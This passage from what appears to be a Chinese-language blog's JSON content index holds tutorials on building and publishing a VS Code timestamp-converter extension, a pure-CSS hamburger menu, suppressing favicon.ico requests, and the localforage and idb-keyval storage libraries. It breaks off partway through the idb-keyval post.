Extension(Typescript) 產生使用typescript開發的extension專案 New Extension(Javascript) 產生使用javascript開發的extension專案 New Color Theme 配置VSCode介面顏色的擴充套件專案(詳見: Color Theme) New Language Support 程式語言(Programming Languages)擴充套件 New Code Snippets 程式碼片段擴充套件 New Keymap 快捷鍵擴充套件，keymap讓使用者得以在vscode中使用vim、sublime等等不同編輯器的快捷鍵開發。 New Extension Pack 打包多個已發佈的extension，讓使用者一鍵快速安裝。 New Language Pack (Localization) 配置VSCode編輯器多國語氣的擴充套件。 我們依序輸入如下：\nWhat type of extension do you want to create?\n選擇你要建立的專案類型\n這邊我選擇第一個 New Extension(Typescript) 選項\nWhat’s the name of your extension?\nExtension 名稱: 對應到 package.json \u0026ldquo;displayName\u0026rdquo;\n這裡我輸入： wconvert\nWhat’s the identifier of your extension?\n識別碼：對應到 package.json \u0026ldquo;name\u0026rdquo;\n這裡我輸入： wconvert\nWhat’s the description of your extension?\n描述: 對應到 package.json \u0026ldquo;description\u0026rdquo;\n這裡我輸入： my first vscode extension practice.\nInitialize a git repository?\n是否要使用 git\nBundle the source code with webpack?\n是否要使用 webpack 做原始碼的 bundle\nWhich package manager to use?\n要使用哪個套件管理工具\n讓子彈飛一會兒，最後 generator 會詢問是否使用 vscode 打開，這邊選擇打開。\nExtension 專案重點相關檔案介紹 打開後，我們會看到一個 nodejs 的 typescript 專案，結構如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ├── .vscode │ ├── extensions.json │ ├── launch.json │ ├── settings.json │ └── tasks.json ├── node_modules ├── src │ ├── extension.ts │ └── test │ ├── runTest.ts │ └── suite │ ├── extension.test.ts │ └── index.ts ├── .eslintrc.json ├── .gitignore ├── .vscodeignore ├── CHANGELOG.md ├── README.md ├── package-lock.json ├── package.json ├── tsconfig.json └── vsc-extension-quickstart.md .vscode/*： workspace 設定 檔案名稱 說明 task.json 設定 defaultBuild Task，用於 compile extension 專案的 typescript 程式。 launch.json 配置 debug mode 的兩個選項：Run extension 與 Test extension，用於執行 extension 主程式與相關測試程式，程式執行前，會先執行 defulat buildTask。 settings.json extension 專案的設定檔，此處的設定會覆蓋 user settings 跟 default settings。 extensions.json 設定用於輔助 extension 專案安裝的 extension recommendations list，此處推薦安裝 eslint extension。 src/extensions.ts： 主程式檔案 src/test.ts： 測試程式檔案 .eslintrc.json： 用於 extension 專案的 eslint 設置 .vscodeignore： 用於忽略不打包進發布套件的專案檔案 tsconfig.json： 用於專案 ts compiler 的設定選項 package.json： 用於配置 node 相關依賴與相關 npm script，在 extension 專案裡，package.json 亦用於配置 extension 重要相關設定 (詳見: Extension Manifest) vsc-extension-quickstart.md： 產生的 extension 專案的 markdown 說明文件 Extension 專案程式簡介 讓我們打開 extension.ts 吧，打開後可以看見 extension.ts 裡面有個 active function 跟 deactive function。\nactive function 為 extension 程式的進入點。當 extension 被 active 事件啟動時，即會執行 extension 程式。\n因此我們可以查看 pakcage.json，package.json 配置了 activeEvents 清單，可以看到清單裡列出跟active 有關的設定 activationEvents。\npackage.json 1 2 3 4 5 6 7 { // ... \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.helloWorld\u0026#34; ], // ... } activationEvents 指定了一個 hello world command，此即是說，當使用者執行 hello world command 時，extension 即會活躍並執行 active function。\n此處的 onCommand 語法為：\n1 onCommand: ${commandId} 那麼，command 的 id 是在哪裡配置的呢？\n一樣是在 package.json 裡，我們可以到 contributes 屬性 (Contribution Point: 詳見 Contribution Point) 下面查看：\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 { // ... \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.helloWorld\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Hello World\u0026#34; } ] }, // ... } 可以看到在 contrubutes 屬性下面已經配置了 commands 清單，裡面條列著一個 command 設定，此處 command 設定的語法為：\n1 2 3 4 5 6 7 { /** * 被產生的Command會預設使用extension的id作為namespace，亦可自訂其他Namespace名稱 */ \u0026#34;command\u0026#34;: ${自定義的command-id}, \u0026#34;title\u0026#34;: ${Command的標題內容} } 當我們使用 Command Palette (Cmd/Ctrl + Shift + P) 搜尋 Command 並執行時，是使用 Command 的 Title 搜尋。\n好，現在我們已經了解如何在 Contribution Point 設定簡單的 Command id 跟 title，以及設定它為活躍 extension 的 event。現在回到 extension.ts 的 active function 吧！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export function activate(context: vscode.ExtensionContext) { // Use the console to output diagnostic information (console.log) and errors (console.error) // This line of code will only be executed once when your extension is activated console.log(\u0026#39;Congratulations, your extension \u0026#34;wconvert\u0026#34; is now active!\u0026#39;); // The command has been defined in the package.json file // Now provide the implementation of the command with registerCommand // The commandId parameter must match the command field in package.json let disposable = vscode.commands.registerCommand(\u0026#39;wconvert.helloWorld\u0026#39;, () =\u0026gt; { // The code you place here will be executed every time your command is executed // Display a message box to the user vscode.window.showInformationMessage(\u0026#39;Hello World from wconvert!\u0026#39;); }); context.subscriptions.push(disposable); } 我們可以看到，active function 裡面在 extenions 活躍後將註冊我們在 Contribution Point 那邊設定的 command id，並且有一個 callback 函式，當我們配置的 command 執行之後，即會在 vscode 裡跳出顯示「Hello World from day05-first-command!」的訊息。\n這個註冊過後的 command 函式 (disposable) 會再 push 進 extension context 裡面，如此當 extension 被關閉後，VSCode 就可以自動釋放 listen 這個 command 的相關資源。\n執行 extension 專案應用程式 讓我們來執行 extension 吧，vscode 專案已經幫我們配置好了 lanunch.json，因此我們可以在 debug mode 裡執行 extension。讓我們點開「Run and Debug」，再點擊 sidebar 上方的 Run Extension 旁的執行按鈕開始 extension 吧！(此處的快捷鍵為 F5)\n執行後，vscode 會開啟一個新的 vscode 的 window 視窗，window 視窗上的 title 會註明這個視窗為 [Extension Development Host] 並預設載入 extension 了，我們可以在這個視窗操作我們開發中的 extension，並且使用中斷點偵錯。\n檢查已被註冊的 command 先來檢查一下剛才註冊的 command，在 Contribution Point 裡宣告的 Command，一樣在 Keyboard Shortcuts 下方可以搜尋的到。從 Manager \u0026gt; Keyboard Shortcuts 進入 Keyboard Shortcuts 頁中，並在搜尋條上輸入 wconvert，使用 extension id 來列出剛才註冊的 command。\n輸入後我們可以看到，Command 已正確被註冊。\n執行註冊後的 Command 現在，我們打開 Command Palette (快捷鍵：Cmd/Ctrl + Shift + P)，輸入 hello world，使用註冊的 Command Title 查找到 command。\n然後，點擊下去，我們可以看到 vscode 的 window 正確跳出「Hello World from day05-first-command!」訊息。\n然後，我們回到原本專案的 Vscode Window，我們可以在專案的 debug console 檢視 active function 下面的 console.log 訊息。\n加入套件邏輯 這邊可以依照你的需求進行套件邏輯的開發，我只是寫來玩而已，此處參考即可！\n註冊自己想要使用的 Command 我打算製作以下幾個功能：\n輸入指定的時間格式，會在當前檔案指標位置插入產生的時間戳 輸入指定的時間格式，僅會在vscode 的 window 顯示 將選取起來的時間戳，轉換為指定時區的時間格式(這邊以 YYYY-MM-DD hh:mm:ss.milsecond 格式為主) 附上完成後的程式碼：\nextension.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 import * as vscode from \u0026#39;vscode\u0026#39;; export function activate(context: vscode.ExtensionContext) { const input = async (placeHolder: string) =\u0026gt; await vscode.window.showInputBox({ placeHolder }) || \u0026#39;\u0026#39;; function pad(num: string | number, size: number): string { num = num.toString(); while (num.length \u0026lt; size) { num = \u0026#34;0\u0026#34; + num; } return num; } // show timestamp at vscode Information Window function showTimestamp(datetime: string) { let timestamp: number | undefined = NaN; try { timestamp = new Date(datetime).getTime(); if (typeof timestamp !== \u0026#34;number\u0026#34; || isNaN(timestamp) || timestamp.toString() === \u0026#34;NaN\u0026#34;) { return askDateTime(); }; vscode.window.showInformationMessage(timestamp.toString()); } catch(e) { console.log(e); vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); askDateTime(); } } // create input with asking DateTime async function askDateTime() { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)：\u0026#34;); if (fullDateTime) { showTimestamp(fullDateTime); } } // Insert timestamp at cursor position vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.genTimestamp\u0026#34;, async (editor, edit) =\u0026gt; { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)：\u0026#34;); if (!fullDateTime) { return; } try { let timestamp = new Date(fullDateTime).getTime(); if (!isNaN(timestamp) \u0026amp;\u0026amp; typeof timestamp === \u0026#34;number\u0026#34; \u0026amp;\u0026amp; timestamp.toString() !== \u0026#34;NaN\u0026#34;) { editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { editBuilder.insert(selectionItem.active, timestamp.toString()); }); }); } else { vscode.window.showErrorMessage(\u0026#34;Datetime convert failed.\u0026#34;); } } catch(e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); // only show generated timestamp let generateTimestamp = vscode.commands.registerCommand(\u0026#34;wconvert.genTimestampJustShow\u0026#34;, askDateTime); // format timestamp to YYYY-MM-DD HH:mm:ss that selections let timestamp2DateTime = vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.timestamp2dateTime\u0026#34;, async (editor, edit) =\u0026gt; { const offsetStr = await input(\u0026#34;Time zone (example: +8)：\u0026#34;); const offset = Number(offsetStr); editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { try { const selection = editor.document.getText(selectionItem); let dateArr = new Date(parseInt(selection) - (-offset * 60 * 60 * 1000)).toISOString().split(\u0026#34;T\u0026#34;); const [YYYYMMDD, hhmmss] = dateArr; const [year, month, day] = YYYYMMDD.split(\u0026#34;-\u0026#34;); const [hour, minute, fullSecond] = hhmmss.split(\u0026#34;:\u0026#34;); const [second, millionSecondZ] = fullSecond.split(\u0026#34;.\u0026#34;); const millionSecond = millionSecondZ.replace(\u0026#34;Z\u0026#34;, \u0026#34;\u0026#34;); let fullDateTime = `\u0026#34;${year}-${pad(month, 2)}-${pad(day, 2)} ${pad(hour, 2)}:${pad(minute, 2)}:${pad(second, 2)}.${pad(millionSecond, 3)}\u0026#34;`; editBuilder.replace(selectionItem, fullDateTime); } catch (e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); }); }); context.subscriptions.push(timestamp2DateTime, generateTimestamp); } export function deactivate() {} package.json 的 activationEvents 記得加上欲註冊使用的 command，也可直接使用 \u0026quot;*\u0026quot;，將全部的 command 暴露出去！\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 { \u0026#34;name\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;displayName\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;help you convert datetime value\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.3\u0026#34;, \u0026#34;icon\u0026#34;: \u0026#34;photo.jpeg\u0026#34;, \u0026#34;publisher\u0026#34;: \u0026#34;4006wayne\u0026#34;, \u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert.git\u0026#34; }, \u0026#34;homepage\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert/blob/master/README.md\u0026#34;, \u0026#34;pricing\u0026#34;: \u0026#34;Free\u0026#34;, \u0026#34;engines\u0026#34;: { \u0026#34;vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34; }, \u0026#34;categories\u0026#34;: [ \u0026#34;Other\u0026#34; ], \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.timestamp2dateTime\u0026#34;, \u0026#34;onCommand:wconvert.genTimestamp\u0026#34;, \u0026#34;onCommand:wconvert.genTimestampJustShow\u0026#34; ], \u0026#34;main\u0026#34;: \u0026#34;./out/extension.js\u0026#34;, \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.timestamp2dateTime\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: DateTime to timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestamp\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestampJustShow\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp Only Show\u0026#34; } ] }, \u0026#34;scripts\u0026#34;: { \u0026#34;vscode:prepublish\u0026#34;: \u0026#34;npm run compile\u0026#34;, \u0026#34;compile\u0026#34;: \u0026#34;tsc -p ./\u0026#34;, \u0026#34;watch\u0026#34;: \u0026#34;tsc -watch -p ./\u0026#34;, \u0026#34;pretest\u0026#34;: \u0026#34;npm run compile \u0026amp;\u0026amp; npm run lint\u0026#34;, \u0026#34;lint\u0026#34;: \u0026#34;eslint src --ext ts\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;node ./out/test/runTest.js\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34;, \u0026#34;@types/glob\u0026#34;: \u0026#34;^8.0.0\u0026#34;, \u0026#34;@types/mocha\u0026#34;: \u0026#34;^10.0.0\u0026#34;, \u0026#34;@types/node\u0026#34;: \u0026#34;16.x\u0026#34;, \u0026#34;@typescript-eslint/eslint-plugin\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;@typescript-eslint/parser\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;eslint\u0026#34;: \u0026#34;^8.26.0\u0026#34;, \u0026#34;glob\u0026#34;: \u0026#34;^8.0.3\u0026#34;, \u0026#34;mocha\u0026#34;: \u0026#34;^10.1.0\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^4.8.4\u0026#34;, \u0026#34;@vscode/test-electron\u0026#34;: \u0026#34;^2.2.0\u0026#34; } } 範例 repo\nvsce 打包並發布 Extension，官方文件\n使用 vsce 來打包與發布我的 Extension\n首先全局安裝 vsce：\n1 npm i -g vsce 打包 1 vsce package 下完指令後，會因為沒有 LICENSE 檔案而詢問是否繼續，這邊選擇 Y 直接下一步即可。\n完成後會在指定位置產生一個 .vsix 檔案，此即為我的 Extensions。\n本地安裝我的 Extension 若只是要製作一個自己用的 extension，沒有打算發布到網上，到此步驟即可。\n於 VScode 的 Extensions 頁籤，選擇 Install from VSIX，選擇剛剛產生的 .vsix 檔，即可完成安裝，在 Extensions 的 INSTALLED 內即可看到自己的 extension。\n發布到 Marketplace 前的準備 記住！每次發佈都要幫版本號加一下！\npackage.json 1 2 3 4 5 { // ... \u0026#34;version\u0026#34;: \u0026#34;0.0.1\u0026#34;, // ... } vsce 要求 Personal Access Token 個人訪問金鑰，以下的步驟圖片來源為官方說明文件\n首先請到 https://dev.azure.com/ 申請帳號並登入，在右上角打開 Personal access tokens 頁面。\n點選 New Token 按鈕。\n給這個新 Token一個名字、過期時間，重點是 Organization 請選擇 All accessiable organization，點選 Custom defined 並點選 Show all scopes 打開所有選項。\n找到 Marketplace 項目勾選 Acquire 與 Manage 後點選 Create。\n然後你會得到一個 Token 請複製下來。\n建立發佈器 - Publisher 建立一個 Publisher 用來儲存發佈的 Token ，請在 package.json 中指定要使用的發佈器\u0026quot;publisher\u0026quot;: (publisher name)\npackage.json 1 2 3 4 5 { // ... \u0026#34;publisher\u0026#34;: \u0026#34;{your publisher name}\u0026#34;, // ... } 使用 Marketplace 後台建立 Publisher 請到 https://marketplace.visualstudio.com/manage/publishers/ 建立一個 Publisher。\n使用 vsce 指令建立 Publisher 1 vsce create-publisher (publisher name) 輸入剛剛的 Personal access token，vsce 將會記得這個 publisher 與 token 以方便快速發佈。\nToken 更新 在我們建立 token 時，token 是有效期的，當 token 過期時我們就需要以下這個指來更新 token：\n1 vsce login (publisher name) 發布方式(一)：使用 vsce 發布 extension 下指令發布到 Marketplace：\n1 vsce publish 使用 vsce show 確認 extension 的資訊：\n1 2 # vsce show {publisher name}.{extension id} vsce show 4006wayne.wconvert 也可以在 vsce publish 時直接指定 token：\n1 vsce publish -p \u0026lt;token\u0026gt; 發布方式(二)：使用 Marketplace 後台上傳，發布 extension 前往網址 https://marketplace.visualstudio.com/manage/publishers/，選擇剛剛創建的 Publisher。\n點選 New extension \u0026gt; Visual Studio Code，選擇剛剛 package 出來的 .vsix 檔案後上傳。\n上傳後等待驗證，驗證完畢後即可看到我的 extension：\n結語 到這裡我已經成功發佈我的第一個 Extension 了！\n這是我寫的第一個 Extension，功能很陽春，用途是產生指定時間的時間戳與時間戳轉回指定時區的時間格式。\n非常推薦使用 Typescript 會比較容易開發，不然要查官方API會看得很痛苦，畢竟範例不多或者都要下載才能看。\n實際撰寫時會遇到 VScode API 到底有哪些功能可以使用的問題，甚至要去了解 VScode 的設計結構！\n常見問題 Extension validation error 出現如圖的問題，自行排查 extension 程式碼後發現非程式碼邏輯的問題，可以上 issues 將資訊反應給 vsmarketplace，此可能為 marketplace 驗證 extension 時偵測到特定字元組合而阻擋掉，會專人協助處理。\n附上本人遇到此問題的 Issues\n","date":"2022-11-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52516420035_bc4b9df19c_o.png","permalink":"https://wayneblog.ga/2022-11-22/create-own-vscode-extension/","title":"今天來搞一個屬於自己的 VScode Extension 吧！"},{"content":" 參考網站\n前言 選單一直是製作網頁最基本的功能需求之一，因此對於許多的套件內建都會提供選單的功能，且這些滑動式選單，大部分都是透過 Javascript 所製作而成，最主要的原因就在於，透過 Javascript 可以精準的知道，目前使用是點選開啟還是關閉。\n而最近發現一個超酷的寫法，直接透過 HTML 中的核許框，就可判斷目前是開啟還是關閉，再搭配 CSS 就可實作出展開與收合，甚至連漢堡選單的那圖示，也可透過 CSS 繪製出來，且當選單開啟時，還可透過動畫將選單變叉叉的圖示，因此現在就一塊來看看，如何透過純 CSS 打造出開合式漢堡選單吧！\n做法 1. 加入以下的 HTML 架構 首先，先在HTML中加入以下的HTML架構。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;nav class=\u0026#34;nav-box\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;menu\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;menu\u0026#34; class=\u0026#34;line\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;menu\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;menu-list\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;選單1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;選單2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;選單3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; 2. 加入 CSS 設定漢堡選單的圖示 接著再透過CSS來設定漢堡選單的圖示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* 選單線 */ .line { width: 24px; height: 24px; background: #FFF; cursor: pointer; display: block; padding: 16px; position: fixed; z-index: 2; } .line .menu, .line .menu::before, .line .menu::after { background: #222; content: \u0026#39;\u0026#39;; display: block; height: 1px; position: absolute; transition: background ease .15s, top ease .15s .15s, transform ease .15s; width: 20px; } .line .menu { left: 18px; top: 27px; } .line .menu::before { top: -6px; } .line .menu::after { top: 6px; } 3. 加入 :checked 屬性的判斷 接著再透過 :checked 的屬性，來判斷目前為開啟狀態，當選單開啟時，原來的三條線就變成叉叉。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* 點選選單變叉叉 */ #menu:checked + .line .menu { background: transparent; } #menu:checked + .line .menu::before { transform: rotate(45deg); } #menu:checked + .line .menu::after { transform: rotate(-45deg); } #menu:checked + .line .menu::before, #menu:checked + .line .menu::after { top: 0; transition: top ease .15s, transform ease .15s .15s; } 4. 設定開合樣式 當選單按鈕處理好後，一樣用 :checked 來設定選單展開(200px)與收合(60px)。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /* 選單開合 */ #menu:checked ~ .menu-list { width: 200px; } .menu-list { width: 60px; height: 100vh; background: #FFF; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); padding-top: 60px; position: fixed; z-index: 1; transition: all .3s; overflow: hidden; } /* 選單向外推 */ .menu-list ul { list-style: none; margin-left:70px; padding: 0; } .menu-list ul\u0026gt;li{ display:block; width:100px; } 5. 隱藏 checkbox 都弄好後，再把 input 的核許框給隱藏起來，這樣就可透過純CSS打造出滑動式的漢堡選單啦！\n範例預覽 See the Pen blog/pure-css-toggle-menu-icon by wjdesign (@WJDesign) on CodePen. ","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52514242955_fd814a2b16_o.gif","permalink":"https://wayneblog.ga/2022-11-21/pure-css-toggle-menu-icon/","title":"免JS！純CSS就可打造出，開合式的漢堡選單功能"},{"content":" 參考網站\n問題原因 瀏覽器初到新網站時，會試著下載名為 Favicon (Favorite Icon) 的網站代表圖示，用在地址列、頁籤、書籤(我的最愛)上。\n若網頁沒特別指定，瀏覽器預設會抓取網站根路徑的 /favicon.ico 檔案，找不到就算了不會觸發錯誤。\n一般我們不為會為測試、開發用網站設計圖示，但瀏覽器仍會在第一次存取時嘗試下載 /favicon.ico，不意外地以 HTTP 404 收場：\n嚴格來說，瀏覽器會記住結果，404 失敗只會發生一次(直到瀏覽器重啟)，大小 5KB 說來無傷大雅。但它最困擾我的地方是使用 F12 網路工具或 Fidder 抓封包時，觀察結果天下飛來一筆 /favicon.ico 404，說明時還要額外解釋，蠻煩人的。\n解決方式 爬文查了避免瀏覽器抓 /favicon.ico 的方法，有以下幾種：\nFirefox 25+ 不支援 1 \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; 有些舊瀏覽器不支援 (Android Lollipop) 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;data:,\u0026#34;\u0026gt; 註：若有設定 Content-Security-Policy default-src \u0026lsquo;self\u0026rsquo; 會封限 data:image/png \u0026hellip; 來源，需調整為 default-src 'self' data: 參考 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;data:image/png;base64,iVBORw0KGgo=\u0026#34;\u0026gt; 結論 結論：若只考慮 Chrome，三種做法均可避免瀏覽器嘗試存取 favicon.ico，第三種做法涵蓋瀏覽器最廣。\n","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52513251827_7a73de7710_o.png","permalink":"https://wayneblog.ga/2022-11-21/prevent-invalid-favicon/","title":"避免無效 favicon.ico 存取動作"},{"content":" 參考網站\nlocalStorage 是前端本地儲存的一種，其容量一般在 5M-10M 左右，用來快取一些簡單的資料基本夠用，畢竟定位也不是大資料量的儲存。\n在某些場景下 localStorage 的容量就會有點捉襟見肘，其實瀏覽器是有提供大資料量的本地儲存的如 IndexedDB 儲存資料大小一般在 250M 以上。\n彌補了 localStorage 容量的缺陷，但是使用要比 localStorage 複雜一些 mdn IndexedDB\n不過已經有大佬造了輪子封裝了一些呼叫過程使其使用相對簡單，下面我們一起來看一下～\nlocalforage localforage，擁有類似 localStorage API，它能儲存多種型別的資料如 Array、ArrayBuffer、Blob、Number、Object、String，而不僅僅是字串。\n這意味著我們可以直接存 物件、陣列型別的資料避免了 JSON.stringify 轉換資料的一些問題。\n儲存其他資料型別時需要轉換成上邊對應的型別，比如 vue3 中使用 reactive 定義的資料需要使用 toRaw 轉換成原始資料進行儲存， ref 則直接儲存 xxx.value 資料即可。\n安裝 下載最新版本 或使用 npm、bower 進行安裝，引入下載的 localforage 即可使用。\n通過 npm 安裝： 1 npm install localforage 通過 bower 安裝： 1 bower install localforage 使用 提供了與 localStorage 相同的api，不同的是它是非同步的呼叫返回一個 Promise 物件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 localforage.getItem(\u0026#39;somekey\u0026#39;) .then(function(value) { // 當離線倉庫中的值被載入時，此處程式碼執行 console.log(value); }) .catch(function(err) { // 當出錯時，此處程式碼執行 console.log(err); }); // callback 版本 localforage.getItem(\u0026#39;somekey\u0026#39;, function(err, value) { // 當離線倉庫中的值被載入時，此處程式碼執行 console.log(value); }); 提供的方法 getItem： 根據資料的 key 獲取資料 不存在則返回 null。 setItem： 根據資料的 key 設定資料(儲存 undefined 時 getItem 獲取會返回 null)。 removeItem： 根據 key 刪除資料。 length： 獲取 key 的數量。 key： 根據 key 的索引獲取其名。 keys： 獲取資料倉庫中所有的 key。 iterate： 迭代資料倉庫中的所有 value/key 鍵值對。 配置 完整配置可檢視文件\n這裡說個我覺得很有用的：\n1 localforage.config({ name: \u0026#39;My-localStorage\u0026#39; }); 設定倉庫的名字，不同的名字代表不同的倉庫，當一個應用需要多個本地倉庫隔離資料的時候就很有用。\n1 2 3 4 5 6 const store = localforage.createInstance({ name: \u0026#34;nameHere\u0026#34; }); const otherStore = localforage.createInstance({ name: \u0026#34;otherName\u0026#34; }); // 設定某個資料倉庫 key 的值不會影響到另一個數據倉庫 store.setItem(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); otherStore.setItem(\u0026#34;key\u0026#34;, \u0026#34;value2\u0026#34;); 同時也支援刪除倉庫：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 呼叫時，若不傳參，將刪除當前例項的 “資料倉庫”。 localforage.dropInstance() .then(function() { console.log(\u0026#39;Dropped the store of the current instance\u0026#39;); }); // 呼叫時，若引數為一個指定了 name 和 storeName 屬性的物件，會刪除指定的 “資料倉庫”。 localforage.dropInstance({ name: \u0026#34;otherName\u0026#34;, storeName: \u0026#34;otherStore\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherStore\u0026#39;); }); // 呼叫時，若引數為一個僅指定了 name 屬性的物件，將刪除指定的 “資料庫” (及其所有資料倉庫)。 localforage.dropInstance({ name: \u0026#34;otherName\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherName database\u0026#39;); }); idb-keyval idb-keyval 是用 IndexedDB 實現的一個超級簡單的基於 promise 的鍵值儲存。\n安裝 1 npm install idb-keyval 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 全部引入 import idbKeyval from \u0026#39;idb-keyval\u0026#39;; idbKeyval.set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 按需引入會 treeshake import { get, set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); 瀏覽器直接引入：\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/idb-keyval@6/dist/umd.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 提供的方法 由於其沒有中文的官網，會把例子及自己的理解附上：\nset set： 設定資料\nkey 可以是 Number、String、Date(IDB 也允許這些值的陣列，但 IE 不支援)。 value 可以是 Number、Array、Object、Date、Blobs 等，儘管老 Edge 不支援 null。\n1 2 3 4 5 import { set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); setMany setMany： 設定多個數據\n一次設定多個值，比一個一個的設定更快\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import { set, setMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise.all([set(123, 456), set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 這樣做更快: setMany([ [123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;], ]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get get： 獲取資料\n如果沒有 key，那麼 value 將返回 undefined。\n1 2 3 4 5 import { get } from \u0026#39;idb-keyval\u0026#39;; // logs: \u0026#34;world\u0026#34; get(\u0026#39;hello\u0026#39;) 